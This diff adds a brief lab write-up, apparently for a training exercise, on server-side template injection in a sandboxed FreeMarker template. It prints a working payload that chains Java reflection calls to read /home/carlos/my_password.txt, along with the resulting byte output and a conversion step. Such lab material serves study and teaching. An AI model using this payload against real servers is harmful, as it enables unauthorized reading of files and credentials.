@@ -1,0 +1,23 @@
+Server-side template injection in a sandboxed environment
+
+Again, we trigger an error message:
+<p>Hurry! Only ${product} left of ${product.name} at ${product.price}.</p>
+
+We're dealing with a FreeMarkerProduct object.
+Let's check the docs for a Java object:
+https://docs.oracle.com/javase/7/docs/api/java/lang/Object.html
+
+Let's use this as a payload:
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
+
+Full payload:
+<p>Hurry! Only ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")} left of ${product.name} at ${product.price}.</p>
+
+Hit preview and we'll get this:
+<p>Hurry! Only 122 52 53 122 115 104 117 115 103 122 110 54 102 50 55 120 100 109 104 117 left of Couple's Umbrella at $6.22.</p> 
+
+I've used this website to convert the bytes to ASCII:
+
+https://onlineasciitools.com/convert-bytes-to-ascii
+
+Submit your solution and you're done.
